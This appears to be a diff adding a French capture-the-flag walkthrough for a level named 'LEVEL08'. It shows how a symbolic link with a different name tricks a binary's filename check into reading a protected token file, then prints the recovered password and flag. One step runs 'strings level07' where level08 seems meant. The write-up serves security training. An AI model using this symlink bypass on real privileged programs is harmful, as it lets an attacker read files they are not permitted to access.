@@ -1,0 +1,45 @@
+-----------------------------------------------------------
+                          LEVEL08
+-----------------------------------------------------------
+
+1. On regarde les fichiers mis à notre disposition :
+   --------------------------------------------------------
+   CMD : ls
+   OUTPUT : level08 token
+
+2. On exécute level08 une première fois sans paramètre
+   --------------------------------------------------------
+   CMD : ./level08
+   OUTPUT : ./level08 [file to read]
+
+3. On get les strings à l'intérieur de l'executable level08.
+   L'output indique que le mot token est inscrit en brut
+   dans l'executable. De fait, on suppose qye peut importe
+   le fichier le script level08 retournera l'erreur ce-dessus 
+   si ce dernier contient "token" dans son nom.
+   --------------------------------------------------------
+   CMD : strings level07
+   OUTPUT : [...]
+            token
+            [...]
+
+4. On test notre hypothèse : on créé un fichier /tmp/token
+   et on execute le script avec ce nouveau fichier en
+   paramètre
+   --------------------------------------------------------
+   CMD : touch /tmp/token && ./level08 /tmp/token
+   OUTPUT : You may not access '/tmp/token'
+   
+5. De fait, on créé un lien symbolique vers le fichier token 
+   qui portera un autre nom que token pour gruger ./level08
+   et on exécute
+   --------------------------------------------------------
+   CMD : ln -s /home/user/level08/token /tmp/solver && ./level08 /tmp/solver
+   OUTPUT : quif5eloekouj29ke0vouxean
+
+6. Il suffit maintenant de get le flag pour le niveau
+   suivant avec la commande getflag
+   --------------------------------------------------------
+   CMD : getflag 
+   OUTPUT : Check flag.
+            Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
